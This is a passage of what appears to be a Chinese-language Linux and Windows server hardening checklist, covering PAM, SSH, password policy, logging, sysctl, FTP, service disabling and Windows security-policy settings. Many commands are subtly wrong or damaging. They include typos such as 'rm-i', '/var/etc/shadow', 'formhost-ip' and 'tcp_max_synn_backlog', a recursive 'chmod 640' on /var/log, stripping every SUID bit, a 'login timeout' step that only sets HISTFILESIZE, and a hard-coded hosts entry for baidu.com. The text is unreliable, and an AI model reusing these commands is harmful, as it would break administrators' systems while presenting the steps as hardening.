<h6 id="禁止任何人su为root账户"><a href="#禁止任何人su为root账户" class="headerlink" title="禁止任何人su为root账户"></a>禁止任何人su为root账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改su的配置为配置文件</span></span><br><span class="line">/etc/pam.d/su</span><br><span class="line">	auth  sufficient   /lib/security/pam.rootok.so</span><br><span class="line">	auth  required     /lib/security/pam_wheel.so</span><br><span class="line">	group=wheel</span><br><span class="line"><span class="comment">#如果需要su切换，将用户加入wheel组</span></span><br><span class="line">gpasswd -a username wheel</span><br></pre></td></tr></table></figure>



<h6 id="去除不需要的账号，修改默认账号shell环境"><a href="#去除不需要的账号，修改默认账号shell环境" class="headerlink" title="去除不需要的账号，修改默认账号shell环境"></a>去除不需要的账号，修改默认账号shell环境</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除/锁定多余的用户与组</span></span><br><span class="line">userdel -r username</span><br><span class="line">groupdel groupname</span><br><span class="line">passwd -l username</span><br><span class="line"><span class="comment">#修改程序账户的登录shell</span></span><br><span class="line">usermod -s /sbin/nologin username</span><br></pre></td></tr></table></figure>

<h6 id="限制超级管理员远程登录"><a href="#限制超级管理员远程登录" class="headerlink" title="限制超级管理员远程登录"></a>限制超级管理员远程登录</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改远程管理程序ssh的配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">   permitRootLogin <span class="built_in">yes</span></span><br><span class="line">   ↓</span><br><span class="line">   permitRootLogin no</span><br><span class="line"><span class="comment">#重启sshd服务</span></span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="去掉所有suid和sgid"><a href="#去掉所有suid和sgid" class="headerlink" title="去掉所有suid和sgid"></a>去掉所有suid和sgid</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止提权</span><br><span class="line">#查找具有suid和sgid的对象</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) -exec ls -lg &#123;&#125; \;</span><br><span class="line">find / -type f \( -perm -04000 -o -perm -02000 \) |xargs -l &#123;&#125; ls -lh &#123;&#125;</span><br><span class="line">chmod ugo-s 对象</span><br></pre></td></tr></table></figure>



<h6 id="删除root以外UID为0的用户"><a href="#删除root以外UID为0的用户" class="headerlink" title="删除root以外UID为0的用户"></a>删除root以外UID为0的用户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#检查哪些账户的UID为0</span></span><br><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123; print $1 &#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>删除账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">userdel -r username</span><br></pre></td></tr></table></figure>

<p>或者编辑passwd与shadow文件</p>
<h6 id="不应存在位于高权组的账户"><a href="#不应存在位于高权组的账户" class="headerlink" title="不应存在位于高权组的账户"></a>不应存在位于高权组的账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查哪些账户属于其他组</span></span><br><span class="line">grep -v ^<span class="comment"># /etc/login.defs |grep &quot;^GID_MIN&quot; | awk &#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">awk -F: <span class="string">&#x27;$3&gt;500&#123;print $1&#125;&#x27;</span> /etc/passwd |xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br><span class="line"></span><br><span class="line">grep -v <span class="string">&quot;/sbin/nologin&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I &#123;&#125; grep &#123;&#125; /etc/group</span><br></pre></td></tr></table></figure>

<h6 id="缩短默认密码生存周期"><a href="#缩短默认密码生存周期" class="headerlink" title="缩短默认密码生存周期"></a>缩短默认密码生存周期</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改文件密码策略文件</span></span><br><span class="line">vi /etc/login.defs</span><br><span class="line">	PASS_MAX_DAYS 90   	<span class="comment">#最长使用期限90天</span></span><br><span class="line">	PASS_MIN_DAYS 0     <span class="comment">#最短使用期限0天</span></span><br><span class="line">	PASS_MIN_LEN  8     <span class="comment">#密码最小长度8位</span></span><br><span class="line">	PASS_WARN_AGE 7     <span class="comment">#最长期限到期前7天提醒更改密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="设置密码强度策略"><a href="#设置密码强度策略" class="headerlink" title="设置密码强度策略"></a>设置密码强度策略</h6><p>目的：规范使用高强度密码，延长被爆破的时间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">vi /etc/pam.d/system-auth</span><br><span class="line">	password requisite, pam_cracklib.so</span><br><span class="line">	try_first_pass retry=3 dcredit=-1 1credit=-1</span><br><span class="line">	ucredit=-1 ocredit=-1 minclass=3 minlen=8</span><br><span class="line"></span><br><span class="line"><span class="comment">#centos7以后设置密码复杂度</span></span><br><span class="line">authconfig --passminlen=8 --update    <span class="comment"># 密码最短八位</span></span><br><span class="line">authconfig --enablereqlower --update  <span class="comment">#包含一个小写</span></span><br><span class="line">authconfig --enablerequpper --update  <span class="comment">#包含一个大写</span></span><br><span class="line">authconfig --enablereqdigit --update  <span class="comment">#包含一个数字</span></span><br><span class="line">authconfig --enablereqother --update  <span class="comment">#包含一个字符</span></span><br><span class="line"></span><br><span class="line">在文件/etc/security/pwquality.conf</span><br></pre></td></tr></table></figure>

<h6 id="设置强制密码历史"><a href="#设置强制密码历史" class="headerlink" title="设置强制密码历史"></a>设置强制密码历史</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">	password sufficient pam_unix.so sha512 shadow</span><br><span class="line">	nullok try_first_pass use_authtok remember=5</span><br></pre></td></tr></table></figure>

<h6 id="设置账户锁定策略"><a href="#设置账户锁定策略" class="headerlink" title="设置账户锁定策略"></a>设置账户锁定策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改pam认证文件</span></span><br><span class="line">/etc/pam.d/system-auth</span><br><span class="line">/etc/pam.d/sshd</span><br><span class="line">/etc/pam.d/login</span><br><span class="line">	auth required pam_tally2.so deny=6</span><br><span class="line">	unlock_time=300 even_deny_root</span><br><span class="line">	root_unlock_time=60</span><br><span class="line"><span class="comment">#强制解锁账户的命令</span></span><br><span class="line">pam_tally2 --user zhangsan --reset</span><br></pre></td></tr></table></figure>

<h6 id="修改umask值"><a href="#修改umask值" class="headerlink" title="修改umask值"></a>修改umask值</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改启动脚本文件</span></span><br><span class="line">/etc/profile</span><br><span class="line">/etc/csh.login</span><br><span class="line">/etc/csh.cshrc</span><br><span class="line">/etc/bashrc</span><br><span class="line"><span class="comment">#在文件末尾加入umask值 反码</span></span><br><span class="line"><span class="built_in">umask</span> 027   <span class="comment"># 权限750</span></span><br></pre></td></tr></table></figure>

<h6 id="限制硬件资源"><a href="#限制硬件资源" class="headerlink" title="限制硬件资源"></a>限制硬件资源</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改限制文件  减缓ddos带来的危害  </span></span><br><span class="line"><span class="comment">#加入以下内容</span></span><br><span class="line">vi /etc/security/limits.conf</span><br><span class="line">	soft core  0</span><br><span class="line">	hard core  0</span><br><span class="line">	hard rss   5000   <span class="comment">#限制5m的内存</span></span><br><span class="line">	hard <span class="built_in">nproc</span> 20     <span class="comment">#限制20个进程</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure>



<p>在文件末尾加入信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">session required /lib64/security/pam_limit.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>日常收集进程数使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps aux | grep httpd | wc -l</span><br></pre></td></tr></table></figure>

<h6 id="启用日志功能，使用日志服务器"><a href="#启用日志功能，使用日志服务器" class="headerlink" title="启用日志功能，使用日志服务器"></a>启用日志功能，使用日志服务器</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#日志接收方</span></span><br><span class="line"><span class="comment"># 修改应用服务器日志配置文件</span></span><br><span class="line">vi /etc/rsyslog.conf</span><br><span class="line">	<span class="comment">#开启接收日志功能</span></span><br><span class="line">	<span class="variable">$ModLoad</span> imudp</span><br><span class="line">	<span class="variable">$UDPServerRun</span> 514</span><br><span class="line">	<span class="variable">$template</span> Remote,<span class="string">&quot;/var/1og/%<span class="variable">$YEAR</span>%-%<span class="variable">$MONTH</span>%-%<span class="variable">$DAY</span>%/%fromhost-ip%.log&quot;</span> <span class="comment">#远程日志路径</span></span><br><span class="line">	:formhost-ip,isequal,<span class="string">&quot;127.0.0.1&quot;</span> ?Remote <span class="comment">#本地日志不存储远程文件 </span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#日志发送方</span></span><br><span class="line"><span class="comment"># 确认关键日志审计是否存在</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   /var/log/messages</span><br><span class="line">authpriv.*                                 /var/log/secure</span><br><span class="line"><span class="comment">#添加两行转发日志信息</span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none   @192.168.2.1</span><br><span class="line">authpriv.*                                 @192.168.2.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart rsyslog</span><br><span class="line"><span class="comment">#设置权限为640</span></span><br><span class="line"><span class="built_in">ls</span> -al /var/log/</span><br><span class="line"><span class="built_in">chmod</span> -R 640 /var/log</span><br></pre></td></tr></table></figure>

<h6 id="设置关键文件底层属性"><a href="#设置关键文件底层属性" class="headerlink" title="设置关键文件底层属性"></a>设置关键文件底层属性</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改关键文件和日志的底层属性，降低篡改风险</span></span><br><span class="line">chattr +a /var/log/message</span><br><span class="line">chattr +i /var/log/message.*</span><br><span class="line">chattr +i /var/etc/shadow</span><br><span class="line">chattr +i /var/etc/passwd</span><br><span class="line">chattr +i /var/etc/group</span><br><span class="line"><span class="comment"># 不只限于上述文件，可用lsattr查看更改结果</span></span><br></pre></td></tr></table></figure>

<h6 id="对用户使用ls-rm设置别名"><a href="#对用户使用ls-rm设置别名" class="headerlink" title="对用户使用ls,rm设置别名"></a>对用户使用ls,rm设置别名</h6><p>目的，让ls随时看清文件属性</p>
<p>让rm需要确认后删除目标实施方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改当前用户的登录启动脚本</span></span><br><span class="line">vi ~/.bashrc</span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">ls</span>=<span class="string">&quot;ls -alh&quot;</span></span><br><span class="line">	<span class="built_in">alias</span>  <span class="built_in">rm</span>=<span class="string">&quot;rm-i&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="对开放目录设置粘滞键"><a href="#对开放目录设置粘滞键" class="headerlink" title="对开放目录设置粘滞键"></a>对开放目录设置粘滞键</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目的，允许小规模开放目录，用户作为暂存目录使用</span><br><span class="line">chmod +t /tmp/</span><br></pre></td></tr></table></figure>



<h5 id="通讯协议"><a href="#通讯协议" class="headerlink" title="通讯协议"></a>通讯协议</h5><h6 id="使用加密的远程管理ssh"><a href="#使用加密的远程管理ssh" class="headerlink" title="使用加密的远程管理ssh"></a>使用加密的远程管理ssh</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">	PermitRootLogin   no</span><br><span class="line">	Port              20202</span><br><span class="line">	Protocol          2</span><br><span class="line">systemctl restart sshd</span><br></pre></td></tr></table></figure>

<h6 id="设置访问控制列表"><a href="#设置访问控制列表" class="headerlink" title="设置访问控制列表"></a>设置访问控制列表</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改拒绝策略 </span></span><br><span class="line">vi /etc/hosts.deny</span><br><span class="line">	ALL:ALL</span><br><span class="line"><span class="comment"># 修改允许策略</span></span><br><span class="line">vi /etc/hosts.allow</span><br><span class="line">	sshd: &lt;来访者IP地址&gt;</span><br></pre></td></tr></table></figure>

<h6 id="不响应ICMP请求"><a href="#不响应ICMP请求" class="headerlink" title="不响应ICMP请求"></a>不响应ICMP请求</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改网络策略布尔值</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</span><br></pre></td></tr></table></figure>

<h6 id="禁止处理无源路由"><a href="#禁止处理无源路由" class="headerlink" title="禁止处理无源路由"></a>禁止处理无源路由</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被无源路由抓包  防arp攻击</span></span><br><span class="line"><span class="comment"># 检查是否开启了路由功能</span></span><br><span class="line">sysctl -n net.ipv4.conf.all.accept_source_route</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/net/ipv4/conf/all/accept_source_route</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h6 id="打开syn队列-syn-cookie"><a href="#打开syn队列-syn-cookie" class="headerlink" title="打开syn队列  syn cookie"></a>打开syn队列  syn cookie</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 缓解syn flood攻击  syn洪水</span><br><span class="line">vi /etc/sysctl.conf</span><br><span class="line">	net.ipv4.tcp_syncookies = 1</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<h6 id="防御syn-flood攻击优化"><a href="#防御syn-flood攻击优化" class="headerlink" title="防御syn flood攻击优化"></a>防御syn flood攻击优化</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 修改半连接上限，缓解syn flood攻击</span></span><br><span class="line"><span class="comment"># 查询当前半连接上限</span></span><br><span class="line">sysctl net.ipv4.tcp_max_syn_backlog</span><br><span class="line"><span class="comment"># 修改半连接上限</span></span><br><span class="line">sysctl -w net.ipv4.tcp_max_synn_backlog =<span class="string">&quot;2048&quot;</span></span><br></pre></td></tr></table></figure>

<p>FTP使用黑白名单限制</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止非法账户访问ftp</span></span><br><span class="line"><span class="comment"># 检查黑名单文件是否包括高危账户</span></span><br><span class="line">/etc/ftpusers</span><br><span class="line">root daemon bin sys adm lp uucp nuucp listen nobody noaccess nobody4</span><br><span class="line"><span class="comment"># 使用白名单文件</span></span><br><span class="line">/etc/user_list</span><br><span class="line">	userlist_deny=NO</span><br><span class="line">	userlist_enable=YES</span><br></pre></td></tr></table></figure>

<h6 id="设置FTP上传的文件权限"><a href="#设置FTP上传的文件权限" class="headerlink" title="设置FTP上传的文件权限"></a>设置FTP上传的文件权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被上传执行脚本</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/vsftpd.conf是否存在如下内容</span></span><br><span class="line">	write_enable=YES</span><br><span class="line">	local_umask=022</span><br><span class="line">	anon_umask=022</span><br></pre></td></tr></table></figure>

<h6 id="检查账户目录中是否存在高危文件-netrc、-rhosts"><a href="#检查账户目录中是否存在高危文件-netrc、-rhosts" class="headerlink" title="检查账户目录中是否存在高危文件.netrc、.rhosts"></a>检查账户目录中是否存在高危文件.netrc、.rhosts</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被使用远程登录漏洞</span></span><br><span class="line"><span class="comment"># 检查账户home目录中是否存在远程主机文件</span></span><br><span class="line"><span class="keyword">for</span> DIR <span class="keyword">in</span> <span class="string">&#x27;cut -d&quot;:&quot; -f6 /etc/passwd&#x27;</span>; <span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$DIR</span>/.netrc ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$DIR</span>/.netrc&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment"># 无返回值则表示正常</span></span><br></pre></td></tr></table></figure>

<h6 id="FTP设置banner信息"><a href="#FTP设置banner信息" class="headerlink" title="FTP设置banner信息"></a>FTP设置banner信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止泄露服务信息</span></span><br><span class="line">/etc/vsftpd.conf <span class="comment"># 是否存在如下内容  有的话删除掉</span></span><br><span class="line">	ftpd_banner=<span class="string">&quot;Authorized users only. All activity may be monitored and reported.&quot;</span></span><br></pre></td></tr></table></figure>

<p>配置可信任的NTP服务器，并确保服务开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 保持时间同步，防止某些服务错误</span></span><br><span class="line"><span class="comment"># 检查主配置文件/etc/ntp.conf是否存在如下内容</span></span><br><span class="line">	server X.X.X.X</span><br><span class="line"><span class="comment"># 确保服务被启用</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ntpd</span><br><span class="line">systemctl status ntpd</span><br></pre></td></tr></table></figure>

<h6 id="固化常用DNS解析"><a href="#固化常用DNS解析" class="headerlink" title="固化常用DNS解析"></a>固化常用DNS解析</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改hosts文件</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">	61.59.123.22 www.baidu.com</span><br></pre></td></tr></table></figure>

<h6 id="关闭telnet"><a href="#关闭telnet" class="headerlink" title="关闭telnet"></a>关闭telnet</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 降低被抓包后获取系统关键信息</span></span><br><span class="line"><span class="comment"># 修改telnet配置文件</span></span><br><span class="line">vim /etc/xinetd.d/telnet</span><br><span class="line">	<span class="built_in">disable</span>=<span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<h5 id="补丁管理"><a href="#补丁管理" class="headerlink" title="补丁管理"></a>补丁管理</h5><h6 id="补丁装载"><a href="#补丁装载" class="headerlink" title="补丁装载"></a>补丁装载</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 最好去官方找rpm包，安装补丁，下载时一定要进行签名校验</span><br><span class="line">yum update</span><br><span class="line"># http://www.redhat.com/corp/support/errata</span><br><span class="line">rpm -Fvh rpm包</span><br><span class="line"># 测试环境测试完，在安装</span><br></pre></td></tr></table></figure>

<h5 id="服务进程与启动"><a href="#服务进程与启动" class="headerlink" title="服务进程与启动"></a>服务进程与启动</h5><h6 id="关闭NFS服务"><a href="#关闭NFS服务" class="headerlink" title="关闭NFS服务"></a>关闭NFS服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止被外挂文件系统，导致入侵</span></span><br><span class="line"><span class="comment"># 检查是否存在敏感进程</span></span><br><span class="line">ps aux | grep -E <span class="string">&quot;lockd|nfsd|statd|mountd&quot;</span></span><br><span class="line"><span class="comment"># 检查关闭NFS相关服务</span></span><br><span class="line">systemctl list-unit-files |grep nfs</span><br><span class="line">systemctl <span class="built_in">disable</span> nfs-client.target</span><br></pre></td></tr></table></figure>

<h6 id="关闭无用服务"><a href="#关闭无用服务" class="headerlink" title="关闭无用服务"></a>关闭无用服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭无用服务，提高系统性能，降低漏洞风险</span></span><br><span class="line"><span class="comment"># 检查有哪些自启动服务，并记录列表</span></span><br><span class="line">systemctl list-unit-files |grep <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># 禁用无用服务</span></span><br><span class="line">systemctl stop &lt; 服务名&gt;</span><br><span class="line">systemctl disabled &lt;服务名&gt;</span><br></pre></td></tr></table></figure>

<h6 id="建议关闭的服务"><a href="#建议关闭的服务" class="headerlink" title="建议关闭的服务"></a>建议关闭的服务</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep -E &quot;^amanda|^chargen|^chargen-udp|^cups|^cups-lpd|^daytime|^daytime-udp|^echo|^echo-udp|^eklogin|^ekrb5-telnet|^finger|^gssftp|^imapl^imaps|^ipop2|ipop3|^klogin|^krb5-telnet|^kshell|^ktalk|^ntalk|^rexec|^rlogin|^rsh|^rsync|^talk|^tcpmux-server|^telnet|^tftp|^time-dgram|^time-stream|^uucp&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="banner与自动注销"><a href="#banner与自动注销" class="headerlink" title="banner与自动注销"></a>banner与自动注销</h5><h6 id="隐藏系统提示信息"><a href="#隐藏系统提示信息" class="headerlink" title="隐藏系统提示信息"></a>隐藏系统提示信息</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看登录banner信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issus</span><br><span class="line"><span class="comment"># 清空banner文件</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /etc/issus</span><br></pre></td></tr></table></figure>

<p>设置登录超时注销</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改信息</span></span><br><span class="line">vi /etc/profile</span><br><span class="line">	HISTFILESIZE=50   <span class="comment"># 只能看50行</span></span><br><span class="line"><span class="comment"># 生效</span></span><br><span class="line">	<span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h6 id="跳过grup菜单"><a href="#跳过grup菜单" class="headerlink" title="跳过grup菜单"></a>跳过grup菜单</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 防止在grup菜单对引导过程进行修改</span><br><span class="line"># 修改grup配置文件</span><br><span class="line">vi /boot/grup2/grup.cfg</span><br><span class="line"># 修改等时</span><br><span class="line">set timeout=0</span><br></pre></td></tr></table></figure>

<h6 id="关闭ctrl-alt-del重启功能"><a href="#关闭ctrl-alt-del重启功能" class="headerlink" title="关闭ctrl+alt+del重启功能"></a>关闭ctrl+alt+del重启功能</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vi /usr/lib/systemd/system/ctrl-alt-del.target</span><br><span class="line">	<span class="comment">#注释所有内容</span></span><br></pre></td></tr></table></figure>

<h4 id="windows加固方向"><a href="#windows加固方向" class="headerlink" title="windows加固方向"></a>windows加固方向</h4><h5 id="账号管理与认证授权"><a href="#账号管理与认证授权" class="headerlink" title="账号管理与认证授权"></a>账号管理与认证授权</h5><p>按用户类型分配账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 根据系统要求，设定不同的账户和组，管理员，数据库sa，审计用户，来宾用户</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">	根据用户要求将账号加入功能组</span><br><span class="line">		右击账户-&gt; 属性-&gt;更改隶属于</span><br><span class="line">		右击功能组-&gt;属性-&gt;成员</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="清理系统无用账户"><a href="#清理系统无用账户" class="headerlink" title="清理系统无用账户"></a>清理系统无用账户</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的: 删除或锁定设备运行，维护等工作无关的账号，提高系统账号安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">删除或者锁无关账号(删除操作不可逆)</span><br><span class="line">右击账户-&gt;删除</span><br><span class="line">右击账户-&gt;属性-&gt;账户已禁用</span><br></pre></td></tr></table></figure>

<h6 id="重命名administrator-禁用guest"><a href="#重命名administrator-禁用guest" class="headerlink" title="重命名administrator,禁用guest"></a>重命名administrator,禁用guest</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 减少账户被爆破可能性，提高系统访问安全性</span></span><br><span class="line">打开本地用户和计算机管理器</span><br><span class="line">	打开运行，输入lusrmgr.msc</span><br><span class="line">为管理员administrator账户改名</span><br><span class="line">	右击administrator-&gt;重命名-&gt;属性-&gt;全名</span><br><span class="line">禁用来宾guest</span><br><span class="line">	右击guest -&gt;属性-&gt;账户已禁用</span><br><span class="line">	</span><br><span class="line"><span class="comment">#power user 组 权限仅次于administrator</span></span><br></pre></td></tr></table></figure>

<h6 id="设置密码策略"><a href="#设置密码策略" class="headerlink" title="设置密码策略"></a>设置密码策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止弱口令出现，降低爆破的可能性</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到密码策略</span><br><span class="line">	账户策略-&gt;密码策略</span><br><span class="line">    修改默认值</span><br><span class="line">        密码必须符合复杂性要求:禁用-&gt; 启用</span><br><span class="line">        密码长度最小值: 0-&gt;8</span><br><span class="line">        密码最短使用期限: 0天</span><br><span class="line">        密码最长使用期限:42天-&gt;90天</span><br><span class="line">        强制密码历史:1-&gt;5</span><br><span class="line">        用可还原的加密来存储:禁用</span><br></pre></td></tr></table></figure>

<h6 id="配置账户锁定策略"><a href="#配置账户锁定策略" class="headerlink" title="配置账户锁定策略"></a>配置账户锁定策略</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:有效降低administrator以外的账户被爆破的几率</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到账户锁定策略</span><br><span class="line">	账户策略-&gt;账户锁定策略</span><br><span class="line">		账户锁定时间: 未定义-&gt;30分钟</span><br><span class="line">		账户锁定阈值: 0-&gt;6</span><br><span class="line">		复位账户锁定计数器: 未定义-&gt;30分钟</span><br></pre></td></tr></table></figure>

<p>远程关机权限设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止远程用户非法关闭系统</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	关闭系统策略中，只保留administrator组</span><br><span class="line">	从远程系统强制关机</span><br><span class="line">	拒绝本地登录</span><br><span class="line">	拒绝从网络访问这台计算器</span><br></pre></td></tr></table></figure>

<h6 id="取得文件或对象的所有权设置"><a href="#取得文件或对象的所有权设置" class="headerlink" title="取得文件或对象的所有权设置"></a>取得文件或对象的所有权设置</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止用户非法绕过NTFS权限，获取文件内容</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	取得文件或对象的所有权策略，只保留administrator组</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置从本地登录此计算机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止用户非法登录主机</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到用户权限分配</span><br><span class="line">	本地策略-&gt;用户权限分配</span><br><span class="line">	从本地登陆此计算机策略，加入授权用户</span><br></pre></td></tr></table></figure>

<h5 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 通过审核策略，记录系统登录事件，对象访问事件，软件安装事件，安全事件等</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">找到审核策略</span><br><span class="line">	本地策略-&gt;审核策略</span><br><span class="line">修改审核策略</span><br><span class="line">	<span class="string">&quot;审核策略更改&quot;</span>      设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">	<span class="string">&quot;审核对象访问&quot;</span>      设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核目录服务器访问&quot;</span> 设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核特权使用&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核系统事件&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核账户管理&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核过程追踪&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在具体的文件-&gt;属性-&gt;设置访问</span></span><br></pre></td></tr></table></figure>

